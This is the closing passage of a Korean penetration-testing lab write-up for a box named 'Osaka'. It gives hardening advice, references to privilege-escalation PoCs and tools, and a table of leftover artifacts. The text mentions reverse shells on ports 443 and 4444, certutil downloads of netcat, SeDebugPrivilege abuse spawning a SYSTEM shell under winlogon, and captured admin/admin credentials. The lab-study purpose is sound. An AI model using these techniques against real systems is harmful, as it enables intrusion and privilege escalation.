| **서비스가 대화형 사용자 계정으로 구동** | 셸 CWD가 `C:\Users\Wilson\Desktop` | **전용 저권한 서비스 계정** 또는 **가상 서비스 계정(`NT SERVICE\<name>`)**. 사용자 데스크톱을 작업 디렉터리로 쓰지 않는다 |
| **일반 사용자에게 `SeDebugPrivilege` 부여** | `whoami /priv`에 Enabled | **이 하나만 회수했어도 SYSTEM 상승이 막혔다.** `gpedit` → 로컬 정책 → 사용자 권한 할당 → **"프로그램 디버그"에서 Administrators만 남긴다** |
| `SeLoadDriverPrivilege` 부여 | 목록에 존재 | 동일하게 회수. 커널 코드 실행으로 직결된다 |
| **아웃바운드 무제한** | 443·4444 리버스셸이 모두 성립 | 서버에서 나가는 트래픽을 **명시적 화이트리스트**로 제한. 셸코드가 실행돼도 콜백이 안 나가면 체인이 끊긴다 |
| 21번 FTP가 외부 노출 | nmap 결과 | 평문 프로토콜 폐기(SFTP/FTPS), 필요하면 **관리 VLAN으로 격리** |

---

## 9. 참고 자료

- **CVE 없음** — 랩용 커스텀 FTP 서버다. CWE-134(포맷 스트링) + CWE-121(스택 버퍼 오버플로우)
- `SeDebugPrivilege` PoC (이 박스에서 사용): <https://github.com/r4j3sh-com/SeDebugPrivilegePoC>
- `VirtualAlloc` 원형·플래그(`MEM_COMMIT=0x1000`, `PAGE_EXECUTE_READWRITE=0x40`): <https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc>
- Windows 권한 목록과 의미: <https://learn.microsoft.com/windows/win32/secauthz/privilege-constants>
- 권한 남용 정리 (Potato 계열 포함): <https://github.com/gtworek/Priv2Admin>
- mona.py (ROP 체인 자동 생성): <https://github.com/corelan/mona>
- `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`(부모 프로세스 스푸핑): <https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute>
- LOLBAS `certutil`: <https://lolbas-project.github.io/lolbas/Binaries/Certutil/>

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `C:\Users\Wilson\Desktop\SeDebugPrivilegePoC.exe` | 남아 있음 — 랩 Stop/Revert로 소멸 |
| `C:\Users\Wilson\Desktop\nc64.exe` (335바이트, **404 HTML 쓰레기**) | 남아 있음 |
| `C:\Users\Wilson\Desktop\nc64_new.exe` | 남아 있음 |
| `certutil` URL 캐시 항목 | 남아 있음 (`certutil -urlcache * delete`로 정리 가능) |
| **FTP 서비스 프로세스** | 익스플로잇으로 스택이 파괴되었으므로 **재실행하려면 서비스 재시작이 필요할 가능성이 높다** [가정] |
| winlogon 자식으로 생성된 SYSTEM cmd (PID 1076) | 리버스셸 종료 시까지 유지 |

획득 자격증명: **`admin` / `admin`** (Simple FTP Server). 사용자 계정 `osaka\Wilson`(암호 미확보).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[_STATUS]] — 전수 진행현황 (Osaka: Advanced · 2/2)
- [[Hawat]] — "응답이 성공을 뜻하지 않는다" 패턴. 이 박스의 `certutil` 404-그러나-파일-생성이 같은 계열
- [[01. Pentest Foundations]] — Osaka 항목
